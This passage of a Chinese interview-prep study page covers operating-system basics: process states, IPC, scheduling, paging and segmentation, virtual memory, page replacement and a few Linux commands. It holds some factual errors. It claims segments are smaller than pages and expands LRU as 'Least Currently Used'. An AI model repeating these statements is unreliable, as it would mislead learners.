<p>如果你对Java内存区域 (运行时数据区) 这部分知识不太了解的话可以阅读一下这篇文章：<a href="https://snailclimb.gitee.io/javaguide/#/docs/java/jvm/Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F">《可能是把 Java 内存区域讲的最清楚的一篇文章》</a></p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848734.png" alt="img"></p>
<p>从上图可以看出：一个进程中可以有多个线程，多个线程共享进程的堆和方法区 (JDK1.8 之后的元空间)<strong>资源，但是每个线程有自己的程序计数器、虚拟机栈</strong>和本地方法栈。</p>
<p><strong>总结：</strong> 线程是进程划分成的更小的运行单位,一个进程在其执行的过程中可以产生多个线程。线程和进程最大的不同在于基本上各进程是独立的，而各线程则不一定，因为同一进程中的线程极有可能会相互影响。线程执行开销小，但不利于资源的管理和保护；而进程正相反。</p>
<h3 id="进程有哪几种状态"><a href="#进程有哪几种状态" class="headerlink" title="进程有哪几种状态?"></a>进程有哪几种状态?</h3><p>👨‍💻<strong>面试官</strong> ： 那你再说说<strong>进程有哪几种状态?</strong></p>
<p>🙋 <strong>我</strong> ：我们一般把进程大致分为 5 种状态，这一点和<a href="https://github.com/Snailclimb/JavaGuide/blob/master/docs/java/Multithread/JavaConcurrencyBasicsCommonInterviewQuestionsSummary.md#6-%E8%AF%B4%E8%AF%B4%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%92%8C%E7%8A%B6%E6%80%81">线程</a>很像！</p>
<ul>
<li><strong>创建状态(new)</strong> ：进程正在被创建，尚未到就绪状态。</li>
<li><strong>就绪状态(ready)</strong> ：进程已处于准备运行状态，即进程获得了除了处理器之外的一切所需资源，一旦得到处理器资源(处理器分配的时间片)即可运行。</li>
<li><strong>运行状态(running)</strong> ：进程正在处理器上上运行(单核 CPU 下任意时刻只有一个进程处于运行状态)。</li>
<li><strong>阻塞状态(waiting)</strong> ：又称为等待状态，进程正在等待某一事件而暂停运行如等待某资源为可用或等待 IO 操作完成。即使处理器空闲，该进程也不能运行。</li>
<li><strong>结束状态(terminated)</strong> ：进程正在从系统中消失。可能是进程正常结束或其他原因中断退出运行。</li>
</ul>
<h3 id="进程通信方式"><a href="#进程通信方式" class="headerlink" title="进程通信方式"></a>进程通信方式</h3><p>👨‍💻<strong>面试官</strong> ：<strong>进程间的通信常见的的有哪几种方式呢?</strong></p>
<p>🙋 <strong>我</strong> ：大概有 7 种常见的进程间的通信方式。</p>
<blockquote>
<p>下面这部分总结参考了:<a href="https://www.jianshu.com/p/c1015f5ffa74">《进程间通信 IPC (InterProcess Communication)》</a> 这篇文章，推荐阅读，总结的非常不错。</p>
</blockquote>
<ol>
<li><strong>管道&#x2F;匿名管道(Pipes)</strong> ：用于具有亲缘关系的父子进程间或者兄弟进程之间的通信。</li>
<li><strong>有名管道(Names Pipes)</strong> : 匿名管道由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道。有名管道严格遵循**先进先出(first in first out)**。有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。</li>
<li><strong>信号(Signal)</strong> ：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生；</li>
<li><strong>消息队列(Message Queuing)</strong> ：消息队列是消息的链表,具有特定的格式,存放在内存中并由消息队列标识符标识。管道和消息队列的通信数据都是先进先出的原则。与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中，只有在内核重启(即，操作系统重启)或者显示地删除一个消息队列时，该消息队列才会被真正的删除。消息队列可以实现消息的随机查询,消息不一定要以先进先出的次序读取,也可以按消息的类型读取.比 FIFO 更有优势。<strong>消息队列克服了信号承载信息量少，管道只能承载无格式字 节流以及缓冲区大小受限等缺。</strong></li>
<li><strong>信号量(Semaphores)</strong> ：信号量是一个计数器，用于多进程对共享数据的访问，信号量的意图在于进程间同步。这种通信方式主要用于解决与同步相关的问题并避免竞争条件。</li>
<li><strong>共享内存(Shared memory)</strong> ：使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。可以说这是最有用的进程间通信方式。</li>
<li><strong>套接字(Sockets)</strong> : 此方法主要用于在客户端和服务器之间通过网络进行通信。套接字是支持 TCP&#x2F;IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。</li>
</ol>
<h3 id="线程同步方式"><a href="#线程同步方式" class="headerlink" title="线程同步方式"></a>线程同步方式</h3><p>👨‍💻<strong>面试官</strong> ：<strong>那线程间的同步的方式有哪些呢?</strong></p>
<p>🙋 <strong>我</strong> ：线程同步是两个或多个共享关键资源的线程的并发执行。应该同步线程以避免关键的资源使用冲突。操作系统一般有下面三种线程同步的方式：</p>
<ol>
<li>**互斥量(Mutex)**：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问。比如 Java 中的 synchronized 关键词和各种 Lock 都是这种机制。</li>
<li><strong>信号量(Semphares)</strong> ：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量</li>
<li><strong>事件(Event)</strong> :Wait&#x2F;Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操</li>
</ol>
<h3 id="进程的调度算法"><a href="#进程的调度算法" class="headerlink" title="进程的调度算法"></a>进程的调度算法</h3><p>👨‍💻<strong>面试官</strong> ：<strong>你知道操作系统中进程的调度算法有哪些吗?</strong></p>
<p>🙋 <strong>我</strong> ：嗯嗯！这个我们大学的时候学过，是一个很重要的知识点！</p>
<p>为了确定首先执行哪个进程以及最后执行哪个进程以实现最大 CPU 利用率，计算机科学家已经定义了一些算法，它们是：</p>
<ul>
<li><strong>先到先服务(FCFS)调度算法</strong> : 从就绪队列中选择一个最先进入该队列的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。</li>
<li><strong>短作业优先(SJF)的调度算法</strong> : 从就绪队列中选出一个估计运行时间最短的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。</li>
<li><strong>时间片轮转调度算法</strong> : 时间片轮转调度是一种最古老，最简单，最公平且使用最广的算法，又称 RR(Round robin)调度。每个进程被分配一个时间段，称作它的时间片，即该进程允许运行的时间。</li>
<li><strong>多级反馈队列调度算法</strong> ：前面介绍的几种进程调度的算法都有一定的局限性。如<strong>短进程优先的调度算法，仅照顾了短进程而忽略了长进程</strong> 。多级反馈队列调度算法既能使高优先级的作业得到响应又能使短作业（进程）迅速完成。，因而它是目前<strong>被公认的一种较好的进程调度算法</strong>，UNIX 操作系统采取的便是这种调度算法。</li>
<li><strong>优先级调度</strong> ： 为每个流程分配优先级，首先执行具有最高优先级的进程，依此类推。具有相同优先级的进程以 FCFS 方式执行。可以根据内存要求，时间要求或任何其他资源要求来确定优先级。</li>
</ul>
<h2 id="操作系统内存管理基础"><a href="#操作系统内存管理基础" class="headerlink" title="操作系统内存管理基础"></a>操作系统内存管理基础</h2><h3 id="内存管理介绍"><a href="#内存管理介绍" class="headerlink" title="内存管理介绍"></a>内存管理介绍</h3><p>👨‍💻 <strong>面试官</strong>: <strong>操作系统的内存管理主要是做什么？</strong></p>
<p>🙋 <strong>我：</strong> 操作系统的内存管理主要负责内存的分配与回收（malloc 函数：申请内存，free 函数：释放内存），另外地址转换也就是将逻辑地址转换成相应的物理地址等功能也是操作系统内存管理做的事情。</p>
<h3 id="常见的几种内存管理机制"><a href="#常见的几种内存管理机制" class="headerlink" title="常见的几种内存管理机制"></a>常见的几种内存管理机制</h3><p>👨‍💻 <strong>面试官</strong>: <strong>操作系统的内存管理机制了解吗？内存管理有哪几种方式?</strong></p>
<p>🙋 <strong>我：</strong> 这个在学习操作系统的时候有了解过。</p>
<p>简单分为<strong>连续分配管理方式</strong>和<strong>非连续分配管理方式</strong>这两种。连续分配管理方式是指为一个用户程序分配一个连续的内存空间，常见的如 <strong>块式管理</strong> 。同样地，非连续分配管理方式允许一个程序使用的内存分布在离散或者说不相邻的内存中，常见的如<strong>页式管理</strong> 和 <strong>段式管理</strong>。</p>
<ol>
<li><strong>块式管理</strong> ： 远古时代的计算机操系统的内存管理方式。将内存分为几个固定大小的块，每个块中只包含一个进程。如果程序运行需要内存的话，操作系统就分配给它一块，如果程序运行只需要很小的空间的话，分配的这块内存很大一部分几乎被浪费了。这些在每个块中未被利用的空间，我们称之为碎片。</li>
<li><strong>页式管理</strong> ：把主存分为大小相等且固定的一页一页的形式，页较小，相对相比于块式管理的划分力度更大，提高了内存利用率，减少了碎片。页式管理通过页表对应逻辑地址和物理地址。</li>
<li><strong>段式管理</strong> ： 页式管理虽然提高了内存利用率，但是页式管理其中的页实际并无任何实际意义。 段式管理把主存分为一段段的，每一段的空间又要比一页的空间小很多 。但是，最重要的是段是有实际意义的，每个段定义了一组逻辑信息，例如,有主程序段 MAIN、子程序段 X、数据段 D 及栈段 S 等。 段式管理通过段表对应逻辑地址和物理地址。</li>
</ol>
<p>👨‍💻<strong>面试官</strong> ： 回答的还不错！不过漏掉了一个很重要的 <strong>段页式管理机制</strong> 。段页式管理机制结合了段式管理和页式管理的优点。简单来说段页式管理机制就是把主存先分成若干段，每个段又分成若干页，也就是说 <strong>段页式管理机制</strong> 中段与段之间以及段的内部的都是离散的。</p>
<h3 id="快表和多级页表"><a href="#快表和多级页表" class="headerlink" title="快表和多级页表"></a>快表和多级页表</h3><p>👨‍💻<strong>面试官</strong> ： 页表管理机制中有两个很重要的概念：快表和多级页表，这两个东西分别解决了页表管理中很重要的两个问题。你给我简单介绍一下吧！</p>
<p>🙋 <strong>我</strong> ：在分页内存管理中，很重要的两点是：</p>
<ol>
<li>虚拟地址到物理地址的转换要快。</li>
<li>解决虚拟地址空间大，页表也会很大的问题。</li>
</ol>
<h4 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h4><p>为了解决虚拟地址到物理地址的转换速度，操作系统在 <strong>页表方案</strong> 基础之上引入了 <strong>快表</strong> 来加速虚拟地址到物理地址的转换。我们可以把快表理解为一种特殊的高速缓冲存储器（Cache），其中的内容是页表的一部分或者全部内容。作为页表的 Cache，它的作用与页表相似，但是提高了访问速率。由于采用页表做地址转换，读写内存数据时 CPU 要访问两次主存。有了快表，有时只要访问一次高速缓冲存储器，一次主存，这样可加速查找并提高指令执行速度。</p>
<p>使用快表之后的地址转换流程是这样的：</p>
<ol>
<li>根据虚拟地址中的页号查快表；</li>
<li>如果该页在快表中，直接从快表中读取相应的物理地址；</li>
<li>如果该页不在快表中，就访问内存中的页表，再从页表中得到物理地址，同时将页表中的该映射表项添加到快表中；</li>
<li>当快表填满后，又要登记新页时，就按照一定的淘汰策略淘汰掉快表中的一个页。</li>
</ol>
<p>看完了之后你会发现快表和我们平时经常在我们开发的系统使用的缓存（比如 Redis）很像，的确是这样的，操作系统中的很多思想、很多经典的算法，你都可以在我们日常开发使用的各种工具或者框架中找到它们的影子。</p>
<h4 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h4><p>引入多级页表的主要目的是为了避免把全部页表一直放在内存中占用过多空间，特别是那些根本就不需要的页表就不需要保留在内存中。多级页表属于时间换空间的典型场景，具体可以查看下面这篇文章</p>
<ul>
<li>多级页表如何节约内存：<a href="https://www.polarxiong.com/archives/%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8%E5%A6%82%E4%BD%95%E8%8A%82%E7%BA%A6%E5%86%85%E5%AD%98.html">https://www.polarxiong.com/archives/多级页表如何节约内存.html</a></li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>为了提高内存的空间性能，提出了多级页表的概念；但是提到空间性能是以浪费时间性能为基础的，因此为了补充损失的时间性能，提出了快表（即 TLB）的概念。 不论是快表还是多级页表实际上都利用到了程序的局部性原理</p>
<h3 id="分页机制和分段机制的共同点和区别"><a href="#分页机制和分段机制的共同点和区别" class="headerlink" title="分页机制和分段机制的共同点和区别"></a>分页机制和分段机制的共同点和区别</h3><p>👨‍💻<strong>面试官</strong> ： <strong>分页机制和分段机制有哪些共同点和区别呢？</strong></p>
<ol>
<li>共同点<ul>
<li>分页机制和分段机制都是为了提高内存利用率，较少内存碎片。</li>
<li>页和段都是离散存储的，所以两者都是离散分配内存的方式。但是，每个页和段中的内存是连续的。</li>
</ul>
</li>
<li>区别<ul>
<li>页的大小是固定的，由操作系统决定；而段的大小不固定，取决于我们当前运行的程序。</li>
<li>分页仅仅是为了满足操作系统内存管理的需求，而段是逻辑信息的单位，在程序中可以体现为代码段，数据段，能够更好满足用户的需要。</li>
</ul>
</li>
</ol>
<h3 id="逻辑-虚拟-地址和物理地址"><a href="#逻辑-虚拟-地址和物理地址" class="headerlink" title="逻辑(虚拟)地址和物理地址"></a>逻辑(虚拟)地址和物理地址</h3><p>👨‍💻<strong>面试官</strong> ：你刚刚还提到了<strong>逻辑地址和物理地址</strong>这两个概念，我不太清楚，你能为我解释一下不？</p>
<p>🙋 <strong>我：</strong> em…好的嘛！我们编程一般只有可能和逻辑地址打交道，比如在 C 语言中，指针里面存储的数值就可以理解成为内存里的一个地址，这个地址也就是我们说的逻辑地址，逻辑地址由操作系统决定。物理地址指的是真实物理内存中的地址，更具体一点来说就是内存地址寄存器中的地址。物理地址是内存单元真正的地址。</p>
<h3 id="CPU-寻址了解吗-为什么需要虚拟地址空间"><a href="#CPU-寻址了解吗-为什么需要虚拟地址空间" class="headerlink" title="CPU 寻址了解吗?为什么需要虚拟地址空间?"></a>CPU 寻址了解吗?为什么需要虚拟地址空间?</h3><p>现代处理器使用的是一种称为 <strong>虚拟寻址(Virtual Addressing)</strong> 的寻址方式。<strong>使用虚拟寻址，CPU 需要将虚拟地址翻译成物理地址，这样才能访问到真实的物理内存。</strong> 实际上完成虚拟地址转换为物理地址转换的硬件是 CPU 中含有一个被称为 <strong>内存管理单元（Memory Management Unit, MMU）</strong> 的硬件。如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848062.png" alt="MMU_principle_updated"></p>
<p><strong>为什么要有虚拟地址空间呢？</strong></p>
<p>先从没有虚拟地址空间的时候说起吧！没有虚拟地址空间的时候，<strong>程序都是直接访问和操作的都是物理内存</strong> 。但是这样有什么问题呢？</p>
<ol>
<li>用户程序可以访问任意内存，寻址内存的每个字节，这样就很容易（有意或者无意）破坏操作系统，造成操作系统崩溃。</li>
<li>想要同时运行多个程序特别困难，比如你想同时运行一个微信和一个 QQ 音乐都不行。为什么呢？举个简单的例子：微信在运行的时候给内存地址 1xxx 赋值后，QQ 音乐也同样给内存地址 1xxx 赋值，那么 QQ 音乐对内存的赋值就会覆盖微信之前所赋的值，这就造成了微信这个程序就会崩溃。</li>
</ol>
<p><strong>总结来说：如果直接把物理地址暴露出来的话会带来严重问题，比如可能对操作系统造成伤害以及给同时运行多个程序造成困难。</strong></p>
<p>通过虚拟地址访问内存有以下优势：</p>
<ul>
<li>程序可以使用一系列相邻的虚拟地址来访问物理内存中不相邻的大内存缓冲区。</li>
<li>程序可以使用一系列虚拟地址来访问大于可用物理内存的内存缓冲区。当物理内存的供应量变小时，内存管理器会将物理内存页（通常大小为 4 KB）保存到磁盘文件。数据或代码页会根据需要在物理内存与磁盘之间移动。</li>
<li>不同进程使用的虚拟地址彼此隔离。一个进程中的代码无法更改正在由另一进程或操作系统使用的物理内存。</li>
</ul>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><h3 id="什么是虚拟内存-Virtual-Memory"><a href="#什么是虚拟内存-Virtual-Memory" class="headerlink" title="什么是虚拟内存(Virtual Memory)?"></a>什么是虚拟内存(Virtual Memory)?</h3><p>👨‍💻<strong>面试官</strong> ：再问你一个常识性的问题！<strong>什么是虚拟内存(Virtual Memory)?</strong></p>
<p>🙋 <strong>我</strong> ：这个在我们平时使用电脑特别是 Windows 系统的时候太常见了。很多时候我们使用点开了很多占内存的软件，这些软件占用的内存可能已经远远超出了我们电脑本身具有的物理内存。<strong>为什么可以这样呢？</strong> 正是因为 <strong>虚拟内存</strong> 的存在，通过 <strong>虚拟内存</strong> 可以让程序可以拥有超过系统物理内存大小的可用内存空间。另外，<strong>虚拟内存为每个进程提供了一个一致的、私有的地址空间，它让每个进程产生了一种自己在独享主存的错觉（每个进程拥有一片连续完整的内存空间）</strong>。这样会更加有效地管理内存并减少出错。</p>
<p><strong>虚拟内存</strong>是计算机系统内存管理的一种技术，我们可以手动设置自己电脑的虚拟内存。不要单纯认为虚拟内存只是“使用硬盘空间来扩展内存“的技术。<strong>虚拟内存的重要意义是它定义了一个连续的虚拟地址空间</strong>，并且 <strong>把内存扩展到硬盘空间</strong>。推荐阅读：<a href="https://juejin.im/post/59f8691b51882534af254317">《虚拟内存的那点事儿》</a></p>
<p>维基百科中有几句话是这样介绍虚拟内存的。</p>
<blockquote>
<p><strong>虚拟内存</strong> 使得应用程序认为它拥有连续的可用的内存（一个连续完整的地址空间），而实际上，它通常是被分隔成多个物理内存碎片，还有部分暂时存储在外部磁盘存储器上，在需要时进行数据交换。与没有使用虚拟内存技术的系统相比，使用这种技术的系统使得大型程序的编写变得更容易，对真正的物理内存（例如 RAM）的使用也更有效率。目前，大多数操作系统都使用了虚拟内存，如 Windows 家族的“虚拟内存”；Linux 的“交换空间”等。From:<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98">https://zh.wikipedia.org/wiki/虚拟内存</a></p>
</blockquote>
<h3 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h3><p>👨‍💻<strong>面试官</strong> ：要想更好地理解虚拟内存技术，必须要知道计算机中著名的<strong>局部性原理</strong>。另外，局部性原理既适用于程序结构，也适用于数据结构，是非常重要的一个概念。</p>
<p>🙋 <strong>我</strong> ：局部性原理是虚拟内存技术的基础，正是因为程序运行具有局部性原理，才可以只装入部分程序到内存就开始运行。</p>
<p>局部性原理表现在以下两个方面：</p>
<ol>
<li><strong>时间局部性</strong> ：如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。产生时间局部性的典型原因，是由于在程序中存在着大量的循环操作。</li>
<li><strong>空间局部性</strong> ：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，这是因为指令通常是顺序存放、顺序执行的，数据也一般是以向量、数组、表等形式簇聚存储的。</li>
</ol>
<p>时间局部性是通过将近来使用的指令和数据保存到高速缓存存储器中，并使用高速缓存的层次结构实现。空间局部性通常是使用较大的高速缓存，并将预取机制集成到高速缓存控制逻辑中实现。虚拟内存技术实际上就是建立了 “内存一外存”的两级存储器的结构，利用局部性原理实现髙速缓存。</p>
<h3 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h3><blockquote>
<p><strong>勘误：虚拟存储器又叫做虚拟内存，都是 Virtual Memory 的翻译，属于同一个概念。</strong></p>
</blockquote>
<p>基于局部性原理，在程序装入时，可以将程序的一部分装入内存，而将其他部分留在外存，就可以启动程序执行。由于外存往往比内存大很多，所以我们运行的软件的内存大小实际上是可以比计算机系统实际的内存大小大的。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序。另一方面，操作系统将内存中暂时不使用的内容换到外存上，从而腾出空间存放将要调入内存的信息。这样，计算机好像为用户提供了一个比实际内存大的多的存储器——<strong>虚拟存储器</strong>。</p>
<p>实际上，我觉得虚拟内存同样是一种时间换空间的策略，你用 CPU 的计算时间，页的调入调出花费的时间，换来了一个虚拟的更大的空间来支持程序的运行。不得不感叹，程序世界几乎不是时间换空间就是空间换时间。</p>
<h3 id="虚拟内存的技术实现"><a href="#虚拟内存的技术实现" class="headerlink" title="虚拟内存的技术实现"></a>虚拟内存的技术实现</h3><p>👨‍💻<strong>面试官</strong> ：<strong>虚拟内存技术的实现呢？</strong></p>
<p>🙋 <strong>我</strong> ：<strong>虚拟内存的实现需要建立在离散分配的内存管理方式的基础上。</strong> 虚拟内存的实现有以下三种方式：</p>
<ol>
<li><strong>请求分页存储管理</strong> ：建立在分页管理之上，为了支持虚拟存储器功能而增加了请求调页功能和页面置换功能。请求分页是目前最常用的一种实现虚拟存储器的方法。请求分页存储管理系统中，在作业开始运行之前，仅装入当前要执行的部分段即可运行。假如在作业运行的过程中发现要访问的页面不在内存，则由处理器通知操作系统按照对应的页面置换算法将相应的页面调入到主存，同时操作系统也可以将暂时不用的页面置换到外存中。</li>
<li><strong>请求分段存储管理</strong> ：建立在分段存储管理之上，增加了请求调段功能、分段置换功能。请求分段储存管理方式就如同请求分页储存管理方式一样，在作业开始运行之前，仅装入当前要执行的部分段即可运行；在执行过程中，可使用请求调入中断动态装入要访问但又不在内存的程序段；当内存空间已满，而又需要装入新的段时，根据置换功能适当调出某个段，以便腾出空间而装入新的段。</li>
<li><strong>请求段页式存储管理</strong></li>
</ol>
<p><strong>这里多说一下？很多人容易搞混请求分页与分页存储管理，两者有何不同呢？</strong></p>
<p>请求分页存储管理建立在分页管理之上。他们的根本区别是是否将程序全部所需的全部地址空间都装入主存，这也是请求分页存储管理可以提供虚拟内存的原因，我们在上面已经分析过了。</p>
<p>它们之间的根本区别在于是否将一作业的全部地址空间同时装入主存。请求分页存储管理不要求将作业全部地址空间同时装入主存。基于这一点，请求分页存储管理可以提供虚存，而分页存储管理却不能提供虚存。</p>
<p>不管是上面那种实现方式，我们一般都需要：</p>
<ol>
<li>一定容量的内存和外存：在载入程序的时候，只需要将程序的一部分装入内存，而将其他部分留在外存，然后程序就可以执行了；</li>
<li><strong>缺页中断</strong>：如果<strong>需执行的指令或访问的数据尚未在内存</strong>（称为缺页或缺段），则由处理器通知操作系统将相应的页面或段<strong>调入到内存</strong>，然后继续执行程序；</li>
<li><strong>虚拟地址空间</strong> ：逻辑地址到物理地址的变换。</li>
</ol>
<h3 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h3><p>👨‍💻<strong>面试官</strong> ：虚拟内存管理很重要的一个概念就是页面置换算法。那你说一下 <strong>页面置换算法的作用?常见的页面置换算法有哪些?</strong></p>
<p>🙋 <strong>我</strong> ：</p>
<p>地址映射过程中，若在页面中发现所要访问的页面不在内存中，则发生缺页中断 。</p>
<blockquote>
<p><strong>缺页中断</strong> 就是要访问的<strong>页</strong>不在主存，需要操作系统将其调入主存后再进行访问。 在这个时候，被内存映射的文件实际上成了一个分页交换文件。</p>
</blockquote>
<p>当发生缺页中断时，如果当前内存中并没有空闲的页面，操作系统就必须在内存选择一个页面将其移出内存，以便为即将调入的页面让出空间。用来选择淘汰哪一页的规则叫做页面置换算法，我们可以把页面置换算法看成是淘汰页面的规则。</p>
<ul>
<li><strong>OPT 页面置换算法（最佳页面置换算法）</strong> ：最佳(Optimal, OPT)置换算法所选择的被淘汰页面将是以后永不使用的，或者是在最长时间内不再被访问的页面,这样可以保证获得最低的缺页率。但由于人们目前无法预知进程在内存下的若千页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现。一般作为衡量其他置换算法的方法。</li>
<li><strong>FIFO（First In First Out） 页面置换算法（先进先出页面置换算法）</strong> : 总是淘汰最先进入内存的页面，即选择在内存中驻留时间最久的页面进行淘汰。</li>
<li><strong>LRU （Least Currently Used）页面置换算法（最近最久未使用页面置换算法）</strong> ：LRU算法赋予每个页面一个访问字段，用来记录一个页面自上次被访问以来所经历的时间 T，当须淘汰一个页面时，选择现有页面中其 T 值最大的，即最近最久未使用的页面予以淘汰。</li>
<li><strong>LFU （Least Frequently Used）页面置换算法（最少使用页面置换算法）</strong> : 该置换算法选择在之前时期使用最少的页面作为淘汰页。</li>
</ul>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="常考命令"><a href="#常考命令" class="headerlink" title="常考命令"></a>常考命令</h2><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>一个普遍的常识是，在Linux里面总是“白发人送黑发人”，子进程死亡，父进程透过wait()等待子进程死亡，并清理子进程僵尸，当然父进程也可以因此而获得子进程的死亡原因。</p>
<p>kill 父进程，子进程可能会死亡；实际情况是这两种情况都有可能发生，取决A进程的状态。如果A进程是会话首进程，那么A退出后，B进程也会退出；反之如果A进程不是会话首进程，那么A退出后，B进程不会退出。</p>
<h3 id="什么是bash别名？"><a href="#什么是bash别名？" class="headerlink" title="什么是bash别名？"></a>什么是bash别名？</h3><p>相当于自定义 shell 指令<br>如：ll 指令可以查看文件的详细信息，ll 就是一个被定义好的别名，能够大大的简化指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.通过 alias 命令可以查看命令别名</span><br><span class="line"><span class="meta">[root]# </span><span class="language-bash"><span class="built_in">alias</span></span></span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias egrep=&#x27;egrep --color=auto&#x27;</span><br><span class="line">alias fgrep=&#x27;fgrep --color=auto&#x27;</span><br><span class="line">alias grep=&#x27;grep --color=auto&#x27;</span><br><span class="line">alias l.=&#x27;ls -d .* --color=auto&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=auto&#x27;</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias which=&#x27;alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde&#x27;</span><br><span class="line"></span><br><span class="line">2.定义新的别</span><br><span class="line"><span class="meta">[root]#</span><span class="language-bash"><span class="built_in">alias</span> rmall = <span class="string">&#x27;rm -rf&#x27;</span></span></span><br><span class="line"></span><br><span class="line">3.取消别名</span><br><span class="line"><span class="meta">[root]# </span><span class="language-bash"><span class="built_in">unalias</span> rmall</span></span><br></pre></td></tr></table></figure>



<h2 id="从认识操作系统开始"><a href="#从认识操作系统开始" class="headerlink" title="从认识操作系统开始"></a>从认识操作系统开始</h2><h3 id="操作系统简单分类"><a href="#操作系统简单分类" class="headerlink" title="操作系统简单分类"></a>操作系统简单分类</h3><h4 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h4><p>最早的多用户、多任务操作系统 。后面崛起的 Linux 在很多方面都参考了 Unix。</p>
<p>目前这款操作系统已经逐渐逐渐退出操作系统的舞台。</p>
<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><p><strong>Linux 是一套免费使用、开源的类 Unix 操作系统。</strong> Linux 存在着许多不同的发行版本，但它们都使用了 <strong>Linux 内核</strong> 。</p>
<blockquote>
<p>严格来讲，Linux 这个词本身只表示 Linux 内核，在 GNU&#x2F;Linux 系统中，Linux 实际就是 Linux 内核，而该系统的其余部分主要是由 GNU 工程编写和提供的程序组成。单独的 Linux 内核并不能成为一个可以正常工作的操作系统。</p>
<p><strong>很多人更倾向使用 “GNU&#x2F;Linux” 一词来表达人们通常所说的 “Linux”。</strong></p>
</blockquote>
<h4 id="Mac-OS"><a href="#Mac-OS" class="headerlink" title="Mac OS"></a>Mac OS</h4><p>苹果自家的操作系统，编程体验和 Linux 相当，但是界面、软件生态以及用户体验各方面都要比 Linux 操作系统更好。</p>
<h3 id="操作系统的内核（Kernel）"><a href="#操作系统的内核（Kernel）" class="headerlink" title="操作系统的内核（Kernel）"></a>操作系统的内核（Kernel）</h3><p>我们先来看看维基百科对于内核的解释，我觉得总结的非常好！</p>
<blockquote>
<p><strong>内核</strong>（英语：Kernel，又称核心）在计算机科学中是一个用来管理软件发出的数据 I&#x2F;O（输入与输出）要求的电脑程序，将这些要求转译为数据处理的指令并交由中央处理器（CPU）及电脑中其他电子组件进行处理，是现代操作系统中最基本的部分。它是为众多应用程序提供对计算机硬件的安全访问的一部分软件，这种访问是有限的，并由内核决定一个程序在什么时候对某部分硬件操作多长时间。 <strong>直接对硬件操作是非常复杂的。所以内核通常提供一种硬件抽象的方法，来完成这些操作。有了这个，通过进程间通信机制及系统调用，应用进程可间接控制所需的硬件资源（特别是处理器及 IO 设备）。</strong></p>
<p>早期计算机系统的设计中，还没有操作系统的内核这个概念。随着计算机系统的发展，操作系统内核的概念才渐渐明晰起来了!</p>
</blockquote>
<p>简单概括两点：</p>
<ol>
<li><strong>操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。</strong></li>
<li><strong>操作系统的内核是连接应用程序和硬件的桥梁，决定着操作系统的性能和稳定性。</strong></li>
</ol>
<h3 id="中央处理器（CPU，Central-Processing-Unit）"><a href="#中央处理器（CPU，Central-Processing-Unit）" class="headerlink" title="中央处理器（CPU，Central Processing Unit）"></a>中央处理器（CPU，Central Processing Unit）</h3><p>关于 CPU 简单概括三点：</p>
<ol>
<li><strong>CPU 是一台计算机的运算核心（Core）+控制核心（ Control Unit），可以称得上是计算机的大脑。</strong></li>
<li><strong>CPU 主要包括两个部分：控制器+运算器。</strong></li>
<li><strong>CPU 的根本任务就是执行指令，对计算机来说最终都是一串由“0”和“1”组成的序列。</strong></li>
</ol>
